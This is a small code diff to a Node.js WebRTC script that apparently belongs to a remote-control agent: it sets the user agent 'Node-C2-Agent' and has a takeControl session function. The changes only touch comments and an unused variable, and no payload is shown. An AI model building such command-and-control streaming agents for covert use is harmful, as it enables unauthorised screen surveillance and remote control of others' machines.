@@ -10,7 +10,7 @@ const http = require('http');
 // --- WEBRTC SETUP (Node.js Native) ---
 const { RTCPeerConnection, RTCSessionDescription, MediaStream, mediaDevices } = require('@roamhq/wrtc');
 
-// Expose navigator to satisfy library checks
+// Expose navigator to satisfy library checks and provide getDisplayMedia
 global.navigator = {
     mediaDevices: mediaDevices,
     userAgent: 'Node-C2-Agent'
@@ -60,7 +60,6 @@ try {
 let peerConnection = null;
 let localStream = null;
 let remotePeerId = null;
-let htmlServer = null;
 
 // --- INIT CONNECTION ---
 function initConnection() {
@@ -239,7 +238,6 @@ async function handleJoinRequest(fromId) {
 
  peerConnection.ontrack = (event) => {
  log("[WEBRTC] Remote stream received!");
- // If we want to display remote streams, we'd set up a viewer here
  };
 
  log("[SIG] Creating Offer");
@@ -376,7 +374,7 @@ function takeControl(state) {
  isSessionActive = state;
 }
 
-// --- HTTP SERVER FOR VIDEO DISPLAY ---
+// --- HTTP SERVER FOR LOCAL VIEWER (Optional but good for debugging) ---
 const PORT = process.env.PORT || 3000;
 
 const server = http.createServer((req, res) => {
